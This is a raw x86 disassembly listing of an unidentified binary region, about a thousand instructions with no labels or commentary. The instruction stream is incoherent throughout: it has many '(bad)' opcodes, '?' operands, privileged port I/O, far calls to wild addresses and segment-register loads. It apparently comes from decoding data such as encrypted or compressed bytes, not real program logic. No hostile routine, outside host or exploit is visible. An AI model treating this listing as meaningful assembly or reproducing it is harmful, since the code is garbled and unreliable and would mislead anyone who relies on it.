  4089a8:	push   cs
  4089a9:	mov    dl,0x66
  4089ab:	fcmovnbe st,st(3)
  4089ad:	lds    esp,FWORD PTR [esi+0x4c6f9be2]
  4089b3:	dec    edi
  4089b4:	push   eax
  4089b5:	rcr    BYTE PTR [edx],0xbd
  4089b8:	add    BYTE PTR [ecx+0x75],0xff
  4089bc:	inc    ecx
  4089bd:	aad    0xe8
  4089bf:	pmulhuw mm1,QWORD PTR [ebp+eax*4+0x79647c9a]
  4089c7:	loopne 0x4089ad
  4089c9:	mov    dl,cl
  4089cb:	mov    BYTE PTR [edi-0x5b],dl
  4089ce:	sbb    DWORD PTR [ebp+0x4ad243ab],ecx
  4089d4:	aad    0x59
  4089d6:	cdq    
  4089d7:	mov    ebp,0xcae7283f
  4089dc:	sbb    DWORD PTR [ecx+0x29],eax
  4089df:	cmc    
  4089e0:	sbb    edx,DWORD PTR ds:0x73899b3a
  4089e6:	enter  0xc297,0xac
  4089ea:	repz mov al,0xab
  4089ed:	mov    al,0x95
  4089ef:	pop    edx
  4089f0:	lahf   
  4089f1:	push   ebx
  4089f2:	mov    eax,ds:0xe12a7230
  4089f7:	adc    ah,cl
  4089f9:	pop    ebx
  4089fa:	enter  0x2c8b,0xb1
  4089fe:	and    ch,BYTE PTR [edx-0x2859a4c8]
  408a04:	aas    
  408a05:	mov    al,BYTE PTR [edi+0x440cc76e]
  408a0b:	or     eax,0xca162d06
  408a10:	out    0xf4,al
  408a12:	push   ebp
  408a13:	loop   0x408a15
  408a15:	test   DWORD PTR [edx],esp
  408a17:	fwait
  408a18:	inc    esp
  408a19:	fst    QWORD PTR [ecx]
  408a1b:	pop    ds
  408a1c:	rcr    DWORD PTR [ebx-0x415eb01e],cl
  408a22:	jae    0x408a37
  408a24:	xchg   BYTE PTR [ecx+0x10b4fdac],ah
  408a2a:	add    ebp,DWORD PTR [esi]
  408a2c:	jp     0x408a11
  408a2e:	lahf   
  408a2f:	cli    
  408a30:	add    al,0x9e
  408a32:	daa    
  408a33:	pop    ss
  408a34:	push   0xffffffcf
  408a36:	fiadd  DWORD PTR [ecx-0x61]
  408a39:	stos   DWORD PTR es:[edi],eax
  408a3a:	dec    eax
  408a3b:	out    0x3,al
  408a3d:	shl    BYTE PTR [edi],cl
  408a3f:	fiadd  DWORD PTR [ebp-0x6f3a4224]
  408a45:	sbb    eax,0x1cc6e59f
  408a4a:	push   eax
  408a4b:	dec    edx
  408a4c:	cld    
  408a4d:	cmp    ah,BYTE PTR [ecx+0x75]
  408a50:	mov    ebx,0x3db38867
  408a55:	xchg   ebp,eax
  408a56:	retf   0x73ef
  408a59:	fcom   QWORD PTR [edi]
  408a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a5c:	mov    cl,0xce
  408a5e:	and    ah,ah
  408a60:	retf   
  408a61:	pop    eax
  408a62:	push   es
  408a63:	pop    ss
  408a64:	xor    ch,BYTE PTR [ebx-0x71]
  408a67:	loope  0x408a02
  408a69:	(bad)  
  408a6a:	repz int 0x2d
  408a6d:	push   0xffffffdf
  408a6f:	dec    ebp
  408a70:	inc    ebx
  408a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a72:	jp     0x408a1a
  408a74:	not    BYTE PTR [ecx*4-0xd793e8e]
  408a7b:	xor    BYTE PTR [ecx-0x56c6314b],dh
  408a81:	loope  0x408a69
  408a83:	mov    ebx,DWORD PTR [ebp+0x1fa7abe2]
  408a89:	sbb    al,0xce
  408a8b:	xor    dl,bh
  408a8d:	mul    edi
  408a8f:	(bad)
  408a92:	ret    
  408a93:	xchg   edx,eax
  408a94:	dec    ecx
  408a95:	sub    ebp,DWORD PTR [ebx-0x65]
  408a98:	fisttp QWORD PTR [esi-0x1f]
  408a9b:	cwde   
  408a9c:	loop   0x408a37
  408a9e:	mov    al,ds:0xd688fcaf
  408aa3:	mov    al,0xd8
  408aa5:	push   edi
  408aa6:	xchg   esp,eax
  408aa7:	sbb    DWORD PTR [esi+0x6b6ead3f],edx
  408aad:	dec    esp
  408aae:	inc    ebp
  408aaf:	outs   dx,BYTE PTR ds:[esi]
  408ab0:	adc    BYTE PTR [ebx],ah
  408ab2:	push   esp
  408ab3:	call   0xb57f7f6d
  408ab8:	xchg   ebp,eax
  408ab9:	and    BYTE PTR [ebp-0xca005ca],cl
  408abf:	xchg   edi,eax
  408ac0:	xchg   DWORD PTR ds:0xa4bbc1e3,ecx
  408ac6:	addr16 jae 0x408aa9
  408ac9:	sub    al,0x7b
  408acb:	fidivr DWORD PTR [edi+0x2b]
  408ace:	xor    eax,eax
  408ad0:	sub    BYTE PTR [ebx+0x4c],0xed
  408ad4:	push   es
  408ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad6:	jmp    0xcf40a082
  408adb:	jno    0x408ade
  408add:	sub    BYTE PTR [esi],bh
  408adf:	daa    
  408ae0:	fnsave [edi]
  408ae2:	jmp    0x27da4d14
  408ae7:	fcomp  QWORD PTR [ebx+0x6a]
  408aea:	cmp    esp,eax
  408aec:	sbb    BYTE PTR [edx+esi*2+0x55],cl
  408af0:	jbe    0x408b48
  408af2:	add    bh,BYTE PTR [esi+0x70346ec9]
  408af8:	imul   bh
  408afa:	sbb    eax,eax
  408afc:	in     al,0x7d
  408afe:	hlt    
  408aff:	test   al,0xa6
  408b01:	dec    esp
  408b02:	rcr    BYTE PTR [edi],cl
  408b04:	xor    edi,DWORD PTR [ebx+0xa]
  408b07:	xor    edx,DWORD PTR [esi]
  408b09:	jno    0x408b6b
  408b0b:	mov    ds:0x9c1c3ce3,al
  408b10:	aas    
  408b11:	cli    
  408b12:	addr16 and al,0xf6
  408b15:	pop    eax
  408b16:	add    al,0x7f
  408b18:	jmp    0x408b28
  408b1a:	or     bl,BYTE PTR [edi+ebp*2+0x34abada9]
  408b21:	shl    BYTE PTR [eax-0x448170dd],cl
  408b27:	mov    ch,0xb7
  408b29:	xchg   ebp,eax
  408b2a:	mov    eax,0xe7c3ce1
  408b2f:	xor    al,0x8f
  408b31:	push   ds
  408b32:	imul   edx,DWORD PTR [eax-0x51],0x5a
  408b36:	jmp    0x408bac
  408b38:	enter  0x1fd2,0xa9
  408b3c:	bound  esi,QWORD PTR [eax+edi*4+0x21]
  408b40:	popa   
  408b41:	mov    esi,0xde4af045
  408b46:	mov    ecx,0xf3ff802f
  408b4b:	shl    DWORD PTR [bx+si+0x6e],cl
  408b4f:	loop   0x408b5b
  408b51:	out    0x10,eax
  408b53:	inc    ebp
  408b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b55:	mov    bl,0x75
  408b57:	xchg   esp,eax
  408b58:	sbb    al,0xfa
  408b5a:	(bad)  
  408b5b:	popf   
  408b5c:	pop    ss
  408b5d:	mov    ch,0x6f
  408b5f:	in     al,dx
  408b60:	cmp    edi,DWORD PTR [edx]
  408b62:	pop    eax
  408b63:	and    bl,BYTE PTR [ebx+0x6af5c544]
  408b69:	or     bh,BYTE PTR [ebp-0x30]
  408b6c:	fnsave [eax+ebp*8-0x68]
  408b70:	fld    QWORD PTR [ebp+ecx*2-0x57]
  408b74:	je     0x408bae
  408b76:	aas    
  408b77:	mov    BYTE PTR [ebp+0xe],dh
  408b7a:	add    DWORD PTR [eax],esp
  408b7c:	aas    
  408b7d:	retf   
  408b7e:	jge    0x408bb5
  408b80:	in     eax,dx
  408b81:	dec    ecx
  408b82:	stos   DWORD PTR es:[edi],eax
  408b83:	jl     0x408bd8
  408b85:	xchg   edi,eax
  408b86:	add    eax,0x8c4f4319
  408b8b:	out    dx,eax
  408b8c:	dec    BYTE PTR [ebp+esi*1+0x400f1150]
  408b93:	loopne 0x408be9
  408b95:	sub    al,BYTE PTR [esi-0xa]
  408b98:	call   0xa155f12d
  408b9d:	mov    dh,0x42
  408b9f:	jmp    0x408bd2
  408ba1:	inc    DWORD PTR [esi-0x2f]
  408ba4:	dec    ebx
  408ba5:	mov    ebp,ss
  408ba7:	pop    esp
  408ba8:	xchg   ebp,eax
  408ba9:	sbb    DWORD PTR [edi+0x243338f4],esp
  408baf:	mov    dh,0xe6
  408bb1:	adc    esi,ebp
  408bb3:	pop    ss
  408bb4:	nop
  408bb5:	clc    
  408bb6:	cmp    al,0xcd
  408bb9:	pop    esp
  408bba:	imul   esi,esp,0x72
  408bbd:	fisub  WORD PTR [esi-0x26]
  408bc0:	or     DWORD PTR [eax+eax*4-0x4],0xdeebf657
  408bc8:	xchg   edx,eax
  408bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bca:	xchg   ecx,eax
  408bcb:	rcl    eax,cl
  408bcd:	jg     0x408b7b
  408bcf:	pop    ebx
  408bd0:	(bad)  
  408bd1:	loope  0x408b8b
  408bd3:	inc    ebp
  408bd4:	repz leave 
  408bd6:	inc    ecx
  408bd7:	into   
  408bd8:	xchg   ebp,eax
  408bd9:	mov    cs,esi
  408bdb:	mov    WORD PTR [eax-0xd],ss
  408bde:	hlt    
  408bdf:	dec    ecx
  408be0:	loop   0x408b9e
  408be2:	stos   DWORD PTR es:[edi],eax
  408be3:	jg     0x408c0d
  408be5:	pusha  
  408be6:	mov    cl,0x6a
  408be8:	push   edx
  408be9:	lods   al,BYTE PTR ds:[esi]
  408bea:	imul   ecx,eax,0x48e94a41
  408bf0:	fadd   DWORD PTR [ecx+0x79]
  408bf3:	outs   dx,DWORD PTR ds:[esi]
  408bf4:	sub    al,BYTE PTR [edi-0x47ec9fae]
  408bfa:	mov    al,0xf1
  408bfc:	aas    
  408bfd:	xlat   BYTE PTR ds:[ebx]
  408bfe:	adc    DWORD PTR [edx],esi
  408c00:	or     al,0xe1
  408c02:	add    esp,eax
  408c04:	aaa    
  408c05:	mov    BYTE PTR ds:0xecf821df,al
  408c0b:	enter  0xe4f6,0x49
  408c0f:	in     al,0x4f
  408c11:	test   esp,esi
  408c13:	dec    eax
  408c14:	fidiv  DWORD PTR [ebx+0x43ef88ea]
  408c1a:	aad    0x5b
  408c1c:	inc    edi
  408c1d:	and    al,0xe5
  408c1f:	ds stos DWORD PTR es:[edi],eax
  408c21:	lods   al,BYTE PTR ds:[esi]
  408c22:	add    dh,BYTE PTR [ecx+ebx*4-0x311258bf]
  408c29:	dec    ebp
  408c2a:	jne    0x408c04
  408c2c:	push   edi
  408c2d:	leave  
  408c2e:	call   0x8ed7:0x5f3f4167
  408c35:	mov    WORD PTR [esi+ebx*2+0x47],fs
  408c39:	imul   ebp,DWORD PTR [ebp+0x30],0x7ca7da63
  408c40:	and    edi,DWORD PTR [ebp+0x36]
  408c43:	jle    0x408c5d
  408c45:	sbb    edx,DWORD PTR [edx-0x2e108ce4]
  408c4b:	mov    esp,0x8a015516
  408c50:	inc    ecx
  408c51:	push   ebx
  408c52:	sbb    eax,0xf56faf4e
  408c57:	fdiv   st,st(1)
  408c59:	in     al,dx
  408c5a:	dec    DWORD PTR [ecx+0x72e9a975]
  408c60:	pop    es
  408c61:	cli    
  408c62:	ins    BYTE PTR es:[edi],dx
  408c63:	add    BYTE PTR ds:0xe5d49ea6,bh
  408c69:	out    0x17,eax
  408c6b:	mov    ss,WORD PTR [edi-0x49a6ab7]
  408c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c72:	loopne 0x408c49
  408c74:	(bad)  
  408c75:	sti    
  408c76:	rcl    dh,1
  408c78:	pushfw 
  408c7a:	dec    ebp
  408c7b:	ficom  WORD PTR [ebp+0x7a]
  408c7e:	sub    BYTE PTR [ecx+ebx*8-0x2344e8d6],al
  408c85:	inc    ebp
  408c86:	stc    
  408c87:	rol    BYTE PTR [ebx-0x4b52bfed],1
  408c8d:	fcmovbe st,st(0)
  408c8f:	call   0xc496:0xd366e3c0
  408c96:	pop    ecx
  408c97:	add    al,0x11
  408c99:	loop   0x408c33
  408c9b:	popa   
  408c9c:	fcomp  QWORD PTR [edx-0x66e0521d]
  408ca2:	or     al,0xeb
  408ca4:	inc    edx
  408ca5:	jns    0x408c82
  408ca7:	jle    0x408cd4
  408ca9:	mov    ecx,0x481e1edc
  408cae:	dec    ebx
  408caf:	mov    es,WORD PTR [edx]
  408cb1:	pop    edi
  408cb2:	pusha  
  408cb3:	js     0x408d04
  408cb5:	push   0x56
  408cb7:	sbb    BYTE PTR [eax+0x0],ch
  408cba:	xchg   ebx,eax
  408cbb:	stc    
  408cbc:	jno    0x408c57
  408cbe:	bound  ecx,QWORD PTR [ebx-0x334026df]
  408cc4:	mov    ds:0xec97da2c,al
  408cc9:	sbb    al,0x23
  408ccb:	inc    edi
  408ccc:	sbb    dh,BYTE PTR [ecx-0x66e11276]
  408cd2:	cmp    DWORD PTR [ebx+ebx*1+0x34],esp
  408cd6:	push   ebx
  408cd7:	cwde   
  408cd8:	add    BYTE PTR [edi-0x125372c1],al
  408cde:	cmp    DWORD PTR [ebp-0x39b58af],0xe44fd99b
  408ce8:	xor    esp,DWORD PTR [ebx+0x7f85f860]
  408cee:	sbb    eax,0x153724ac
  408cf3:	cmp    bl,cl
  408cf5:	dec    edi
  408cf6:	test   BYTE PTR [ecx+0x6b],bl
  408cf9:	mov    eax,ds:0x8808d6d7
  408cfe:	mov    ecx,0xed0152c7
  408d03:	add    dl,bl
  408d05:	fsub   st,st(0)
  408d07:	jns    0x408d62
  408d09:	pop    DWORD PTR [esi]
  408d0b:	jbe    0x408d14
  408d0d:	cmp    ecx,edx
  408d0f:	mov    ds:0x67258ae0,eax
  408d14:	in     al,0xe5
  408d16:	and    DWORD PTR ds:0x2f2c36b2,ebx
  408d1c:	les    esp,FWORD PTR [esi+ebp*8]
  408d1f:	mov    edx,0x40904fac
  408d24:	mov    eax,ds:0xb02cf797
  408d29:	(bad)  
  408d2a:	stos   DWORD PTR es:[edi],eax
  408d2b:	sbb    BYTE PTR [edi],0x7a
  408d2e:	and    al,0x92
  408d30:	ja     0x408ce1
  408d32:	retf   
  408d33:	sub    eax,0xebec9e5c
  408d38:	jns    0x408cf7
  408d3a:	shl    ecx,0x68
  408d3d:	xor    BYTE PTR [ecx-0x498b67cd],al
  408d43:	push   eax
  408d44:	aas    
  408d45:	loope  0x408d92
  408d47:	sbb    al,0xd5
  408d49:	xchg   edi,eax
  408d4a:	(bad)  
  408d4b:	iret   
  408d4c:	inc    edx
  408d4d:	pop    ebx
  408d4e:	adc    eax,0x6c88c084
  408d53:	cmp    DWORD PTR [eax],esp
  408d55:	inc    ebx
  408d56:	push   edx
  408d57:	gs mov bh,0xff
  408d5a:	fsubr  DWORD PTR [edx-0x29166274]
  408d60:	adc    eax,0x255435ac
  408d65:	daa    
  408d66:	or     eax,0x13dd3ab2
  408d6b:	xor    DWORD PTR [ecx],eax
  408d6d:	imul   eax,DWORD PTR [ecx+esi*1+0x33],0xffffffcd
  408d72:	in     eax,0x13
  408d74:	push   ecx
  408d75:	xchg   BYTE PTR [esi-0x6cab09ce],cl
  408d7b:	pop    eax
  408d7c:	sbb    ebx,edi
  408d7e:	jg     0x408d6f
  408d80:	push   0x55
  408d82:	push   esi
  408d83:	push   edx
  408d84:	add    DWORD PTR [eax-0x60],esp
  408d87:	sbb    BYTE PTR [ecx-0x72db0ab8],al
  408d8d:	push   edx
  408d8e:	and    BYTE PTR [eax],dl
  408d90:	pop    esp
  408d91:	xchg   esi,eax
  408d92:	xlat   BYTE PTR ds:[ebx]
  408d93:	pop    ebp
  408d94:	xor    DWORD PTR [edi+0x7b],ecx
  408d97:	jns    0x408d89
  408d99:	rcl    DWORD PTR [ebx],0x89
  408d9c:	mov    edi,DWORD PTR [edi-0xd]
  408d9f:	inc    DWORD PTR [ecx]
  408da1:	aaa    
  408da2:	or     al,0x2b
  408da4:	add    eax,0xf9f11f95
  408da9:	call   0x3dbab4b1
  408dae:	int    0xea
  408db0:	(bad)
  408db4:	jge    0x408d54
  408db6:	sahf   
  408db7:	sbb    DWORD PTR [ebx],esp
  408db9:	dec    DWORD PTR [edi+0x5ef038db]
  408dbf:	inc    eax
  408dc0:	lds    edx,FWORD PTR [edx+ebx*4]
  408dc3:	push   ecx
  408dc4:	push   es
  408dc5:	(bad)  
  408dc7:	adc    ecx,DWORD PTR [esi+0x18b709a2]
  408dcd:	adc    DWORD PTR [eax-0x74049558],0xffffffe6
  408dd4:	xchg   ecx,eax
  408dd5:	xchg   edi,eax
  408dd6:	stos   DWORD PTR es:[edi],eax
  408dd7:	push   0x306fe99e
  408ddc:	fild   DWORD PTR [ebx+0x66466b31]
  408de2:	jmp    0x96fa5bd3
  408de7:	push   edx
  408de8:	jae    0x408e39
  408dea:	ror    BYTE PTR [eax-0x50],1
  408ded:	cli    
  408dee:	outs   dx,DWORD PTR ds:[esi]
  408def:	test   eax,0xe9ec1ebe
  408df4:	int    0x44
  408df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408df7:	ficomp WORD PTR [eax-0x3d8d74a0]
  408dfd:	mov    bh,cl
  408dff:	jge    0x408d97
  408e01:	enter  0x8c88,0xb9
  408e05:	cld    
  408e06:	sbb    eax,DWORD PTR [eax+0x4c]
  408e09:	jnp    0x408e3a
  408e0b:	das    
  408e0c:	push   esp
  408e0d:	bound  ebp,QWORD PTR [esi-0x1984d4b1]
  408e13:	mov    al,ds:0x88955a58
  408e18:	sbb    ch,ah
  408e1a:	in     eax,dx
  408e1b:	adc    BYTE PTR [esi],dl
  408e1d:	xchg   ecx,eax
  408e1e:	sbb    dh,BYTE PTR [ecx-0x4b3a80d0]
  408e24:	push   ebx
  408e25:	stos   DWORD PTR es:[edi],eax
  408e26:	mov    ebp,0x72b58fdb
  408e2b:	jno    0x408e00
  408e2d:	std    
  408e2e:	xchg   DWORD PTR [esi-0x18],edx
  408e31:	(bad)  
  408e32:	(bad)  
  408e33:	inc    ebx
  408e34:	dec    eax
  408e35:	jge    0x408e6d
  408e37:	push   edx
  408e38:	test   DWORD PTR [ebx-0x55fa4d6a],edx
  408e3e:	push   ebp
  408e3f:	js     0x408e27
  408e41:	pop    ebp
  408e42:	mov    cl,0x54
  408e44:	in     eax,0xf8
  408e46:	or     ch,bl
  408e48:	(bad)  
  408e49:	jp     0x408e19
  408e4b:	inc    edx
  408e4c:	sub    al,BYTE PTR [ecx+edi*1+0x21]
  408e50:	jmp    0x408eb1
  408e52:	sbb    edx,DWORD PTR [ebx-0x7d]
  408e55:	inc    eax
  408e56:	cmp    eax,0xadf2228a
  408e5b:	mov    edx,fs
  408e5d:	adc    BYTE PTR [ebx+0x2f],dh
  408e60:	(bad)  
  408e61:	mov    bl,0xf0
  408e63:	sti    
  408e64:	(bad)  
  408e65:	ins    DWORD PTR es:[edi],dx
  408e66:	adc    BYTE PTR [edi],bl
  408e68:	mov    edx,0x554cb93b
  408e6d:	stc    
  408e6e:	fwait
  408e6f:	xchg   edx,eax
  408e70:	jl     0x408dfc
  408e72:	mov    eax,ds:0x27be6aa4
  408e77:	icebp  
  408e78:	xor    al,0x32
  408e7a:	lock jle 0x408ec7
  408e7d:	inc    ecx
  408e7e:	lock jo 0x408ea0
  408e81:	inc    ebp
  408e82:	adc    ecx,DWORD PTR [edx]
  408e84:	mul    esi
  408e86:	or     bh,bh
  408e88:	ja     0x408ef1
  408e8a:	pop    ss
  408e8b:	or     BYTE PTR [edx+0x3abda66c],0xc7
  408e92:	add    eax,0x187d162a
  408e97:	or     ah,BYTE PTR [ebx+ebp*2-0x4f1d0ddf]
  408e9e:	mov    al,0x1
  408ea0:	xchg   cl,bh
  408ea2:	test   BYTE PTR [ecx-0x2c],dl
  408ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ea6:	jl     0x408e76
  408ea8:	ss pop si
  408eab:	inc    edx
  408eac:	push   cs
  408ead:	pop    es
  408eae:	push   edi
  408eaf:	sbb    eax,0x37013f58
  408eb4:	mov    cl,0x1b
  408eb6:	ins    BYTE PTR es:[edi],dx
  408eb7:	and    al,0xd
  408eb9:	xchg   esp,eax
  408eba:	cmp    eax,0xf8443456
  408ebf:	aam    0xed
  408ec1:	clc    
  408ec2:	jne    0x408ea4
  408ec4:	add    DWORD PTR [edi+0x28],ebx
  408ec7:	or     bl,BYTE PTR [esi]
  408ec9:	push   edi
  408eca:	(bad)  
  408ecb:	div    DWORD PTR [edx]
  408ecd:	rol    BYTE PTR [ebx+0x7fbe69f4],0xfc
  408ed4:	call   0xa91f0370
  408ed9:	and    esi,esi
  408edb:	pop    ebp
  408edc:	mov    es,WORD PTR [edi]
  408ede:	stc    
  408edf:	neg    edx
  408ee1:	adc    BYTE PTR [ebx+0x2a945adf],0xfd
  408ee8:	cmp    eax,0x365955dd
  408eed:	push   ebp
  408eee:	int3   
  408eef:	sbb    al,al
  408ef1:	mov    al,0xdc
  408ef3:	sub    ah,dl
  408ef5:	js     0x408f07
  408ef7:	lahf   
  408ef8:	mov    ebp,0x299b469c
  408efd:	outs   dx,DWORD PTR ds:[esi]
  408efe:	retf   0x6fd2
  408f01:	push   ecx
  408f02:	je     0x408f06
  408f04:	stc    
  408f05:	shl    DWORD PTR [esi+edx*8],1
  408f08:	inc    esi
  408f09:	xchg   ebx,eax
  408f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0b:	int    0x6c
  408f0d:	dec    ebp
  408f0e:	aad    0x51
  408f10:	jbe    0x408f08
  408f12:	push   ss
  408f13:	and    BYTE PTR [esi+ebp*4],bh
  408f16:	push   ebp
  408f17:	fs pop es
  408f19:	pop    edi
  408f1a:	stos   DWORD PTR es:[edi],eax
  408f1b:	adc    edx,ebx
  408f1d:	out    0xc0,al
  408f1f:	mov    ds:0xae02dac2,al
  408f24:	inc    ebx
  408f25:	inc    ecx
  408f26:	fimul  DWORD PTR [edx]
  408f28:	push   es
  408f29:	dec    ebp
  408f2a:	mov    ds:0x5b47ac0c,al
  408f2f:	loop   0x408faa
  408f31:	and    bh,0x1d
  408f34:	scas   al,BYTE PTR es:[edi]
  408f35:	sbb    DWORD PTR [eax+0x48b20de8],edx
  408f3b:	dec    ebp
  408f3c:	dec    ebx
  408f3d:	loope  0x408efe
  408f3f:	sub    al,0xd0
  408f41:	sbb    ah,BYTE PTR [ecx]
  408f43:	mov    ebp,0xbb8078c3
  408f48:	repz xchg edx,eax
  408f4a:	or     al,0x9d
  408f4c:	xchg   edx,eax
  408f4d:	adc    BYTE PTR [esi+0x45ae1621],cl
  408f53:	sub    BYTE PTR [ebp+eiz*2-0x3e],bl
  408f57:	jmp    0x408f5b
  408f59:	cs enter 0x1d9a,0x78
  408f5e:	pop    ss
  408f5f:	cdq    
  408f60:	fiadd  WORD PTR [ebx-0x49]
  408f63:	lds    ecx,FWORD PTR [esi-0x67acdc4d]
  408f69:	ret    0xf25a
  408f6c:	inc    ebx
  408f6d:	jne    0x408f60
  408f6f:	jecxz  0x408f91
  408f71:	ficom  DWORD PTR [ebx]
  408f73:	jb     0x408fbc
  408f75:	(bad)  
  408f76:	ret    0xcc8
  408f79:	in     eax,dx
  408f7a:	shl    ah,0x94
  408f7d:	fdivr  DWORD PTR [eax+0x7e2c430d]
  408f83:	dec    edx
  408f84:	jne    0x408f51
  408f86:	xor    DWORD PTR [eax],esi
  408f88:	je     0x408f1b
  408f8a:	sub    DWORD PTR [edi+eiz*1],0x24
  408f8e:	fwait
  408f8f:	(bad)  
  408f90:	inc    BYTE PTR [ebx-0x5e]
  408f93:	pop    esp
  408f94:	fadd   QWORD PTR [edi]
  408f96:	or     DWORD PTR [ecx],edx
  408f98:	cmp    BYTE PTR [edx+0x6f61643f],dh
  408f9e:	fbstp  TBYTE PTR [ecx+0x5a28a8bc]
  408fa4:	mov    bl,0x7c
  408fa6:	add    eax,0xe18c5ab4
  408fab:	fucomi st,st(4)
  408fad:	pusha  
  408fae:	enter  0x34a6,0x9
  408fb2:	ins    BYTE PTR es:[edi],dx
  408fb3:	in     al,0xfb
  408fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb6:	sub    eax,DWORD PTR [ebp+esi*8-0x4a]
  408fba:	mov    cl,0xd2
  408fbc:	add    esi,DWORD PTR [edx+0x8c4e716]
  408fc2:	mov    bh,0x81
  408fc4:	inc    edi
  408fc5:	(bad)  
  408fc6:	icebp  
  408fc7:	aaa    
  408fc8:	push   0x12
  408fca:	std    
  408fcb:	popa   
  408fcc:	je     0x40902f
  408fce:	jmp    0x71d9:0x429dbcb8
  408fd5:	sti    
  408fd6:	xor    al,bh
  408fd8:	xlat   BYTE PTR ss:[ebx]
  408fda:	jnp    0x408fa1
  408fdc:	pop    esp
  408fdd:	cli    
  408fde:	mov    ah,0x58
  408fe0:	out    dx,eax
  408fe1:	retf   
  408fe2:	jo     0x408f65
  408fe4:	rcl    al,1
  408fe6:	loop   0x408fe0
  408fe8:	stc    
  408fe9:	xor    BYTE PTR [eax],bh
  408feb:	xchg   esi,eax
  408fec:	jbe    0x408f73
  408fee:	pop    edi
  408fef:	mov    ah,0xd2
  408ff1:	jns    0x408ffb
  408ff3:	push   edx
  408ff4:	fidivr DWORD PTR [ebx+0x247ea67d]
  408ffa:	xchg   esi,eax
  408ffb:	and    al,0x0
  408ffd:	test   al,0xa7
  408fff:	ins    BYTE PTR es:[edi],dx
  409000:	adc    BYTE PTR [esi-0x6377d4af],al
  409006:	retf   
  409007:	or     cl,BYTE PTR ds:0x85ce5463
  40900d:	inc    edi
  40900e:	cwde   
  40900f:	pop    esi
  409010:	mov    WORD PTR [esi],ds
  409012:	popa   
  409013:	push   ss
  409014:	iret   
  409015:	mul    BYTE PTR [ecx-0x32]
  409018:	(bad)  
  409019:	pop    esp
  40901a:	arpl   WORD PTR ds:0xc933eb95,cx
  409020:	frstor [ebx]
  409022:	add    ecx,edx
  409024:	cli    
  409025:	dec    esp
  409026:	push   ebp
  409027:	cmp    DWORD PTR [esi+0x45a7e04b],0xffffff83
  40902e:	push   ds
  40902f:	jge    0x409038
  409031:	int3   
  409032:	test   edx,ebp
  409034:	push   ecx
  409035:	aas    
  409036:	imul   ax,WORD PTR ds:0x9baa97a0,0xff87
  40903e:	fcmovbe st,st(2)
  409040:	xchg   ecx,eax
  409041:	jns    0x409048
  409043:	bound  ecx,QWORD PTR fs:[edx-0xbe17dae]
  40904a:	dec    ebp
  40904b:	jo     0x40901b
  40904d:	nop
  40904e:	fild   WORD PTR [ecx-0x56]
  409051:	jg     0x4090c6
  409053:	adc    BYTE PTR [esi+0x242c27df],bh
  409059:	in     al,0xae
  40905b:	pop    edx
  40905c:	cdq    
  40905d:	mov    ?,WORD PTR [ecx+0xec06a42]
  409063:	xchg   edi,eax
  409064:	jb     0x409090
  409066:	ss out 0x87,eax
  409069:	repnz out dx,eax
  40906b:	sbb    DWORD PTR [ebp+0x6c],0xc
  40906f:	popa   
  409070:	or     al,dh
  409072:	imul   ecx,DWORD PTR [esi-0x36],0xb20b361a
  409079:	mov    eax,ds:0xa2855b87
  40907e:	cmp    ebx,DWORD PTR [esi+0x3db372c7]
  409084:	mov    dl,0xd5
  409086:	sbb    ch,BYTE PTR [ecx+0xa031c16]
  40908c:	mov    al,0x26
  40908e:	rol    BYTE PTR [esi+ebx*2],1
  409091:	in     al,dx
  409092:	test   esp,ebp
  409094:	(bad)  
  409095:	js     0x409079
  409097:	test   al,0xe
  409099:	push   0x3469ccf7
  40909e:	mov    eax,es
  4090a0:	push   esi
  4090a1:	sub    DWORD PTR [ebx-0x10],0xffffffbd
  4090a5:	pop    esi
  4090a6:	cmp    DWORD PTR [edx],ecx
  4090a8:	mov    bh,0xb
  4090aa:	sbb    esi,DWORD PTR [edi]
  4090ac:	add    bl,BYTE PTR [edi-0x242be587]
  4090b2:	sbb    DWORD PTR [esi+ecx*2-0x201b9af7],eax
  4090b9:	pushf  
  4090ba:	and    esp,DWORD PTR ds:0xa118e85
  4090c0:	push   esp
  4090c1:	jg     0x409119
  4090c3:	and    edx,DWORD PTR [edi]
  4090c5:	stos   BYTE PTR es:[edi],al
  4090c6:	or     dl,BYTE PTR [edx+0x30f30e47]
  4090cc:	and    bl,al
  4090ce:	push   es
  4090cf:	call   0xd062b309
  4090d4:	scas   eax,DWORD PTR es:[edi]
  4090d5:	mov    ebp,?
  4090d7:	dec    edx
  4090d8:	dec    ecx
  4090d9:	dec    ebp
  4090da:	and    BYTE PTR [ebx-0x67],cl
  4090dd:	repz or esp,ebx
  4090e0:	cmp    BYTE PTR ds:0xb844240,dh
  4090e6:	mov    BYTE PTR [edx],dh
  4090e8:	ins    BYTE PTR es:[edi],dx
  4090e9:	outs   dx,BYTE PTR ds:[esi]
  4090ea:	dec    eax
  4090eb:	stos   BYTE PTR es:[edi],al
  4090ec:	push   es
  4090ed:	clc    
  4090ee:	mov    al,ds:0x569649ef
  4090f3:	jnp    0x4090fe
  4090f5:	add    al,0x48
  4090f7:	mov    al,0x7d
  4090f9:	xchg   esi,eax
  4090fa:	dec    ebp
  4090fb:	mov    al,0x14
  4090fd:	fs je  0x40915e
  409100:	jmp    0xfd72c157
  409105:	jle    0x40908e
  409107:	out    dx,al
  409108:	pop    esi
  409109:	pop    eax
  40910a:	push   esp
  40910b:	jae    0x40915e
  40910d:	xchg   ebp,eax
  40910e:	shl    DWORD PTR [edi+0x436e3e4a],0x5e
  409115:	retf   0xa66a
  409118:	xor    bl,BYTE PTR [ecx]
  40911a:	shl    BYTE PTR ds:0x7a3d97f6,cl
  409120:	inc    BYTE PTR [edx+0x37bfdef5]
  409126:	mov    gs,WORD PTR [esi+0x59c7cce8]
  40912c:	jmp    0x409191
  40912e:	stos   BYTE PTR es:[edi],al
  40912f:	adc    ecx,ecx
  409131:	add    BYTE PTR [ebx+0x3cd07b52],ch
  409137:	mov    eax,ds:0x7444dc5d
  40913c:	out    0xd,eax
  40913e:	pop    eax
